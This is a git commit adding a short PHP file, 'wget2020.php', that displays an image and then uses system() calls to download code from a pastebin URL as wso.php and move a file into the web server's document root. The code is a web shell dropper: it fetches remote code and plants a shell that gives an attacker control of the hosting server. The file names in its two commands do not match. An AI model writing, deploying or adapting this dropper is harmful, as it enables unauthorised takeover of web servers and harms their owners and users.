7d8f2fa19f142d5cda98133d090892e680782c98
drinjection <62676311+drinjection@users.noreply.github.com>
2020-06-24 01:05:11 +0200

    Add files via upload

---
+++ wget2020.php
@@ -0,0 +1,7 @@
+<body bgcolor="#000000"><br><center><img src="https://i.ibb.co/VgkjdjL/aht.jpg" height="500" width="800"></center>
+<?php
+$x1= 'wget https://pastebin.com/raw/U0bCerAx -O wso.php';
+system($x1);
+$r1= 'mv Eu5EX3g1 '.$_SERVER["DOCUMENT_ROOT"].'/wso.php';
+system($r1); 
+?>
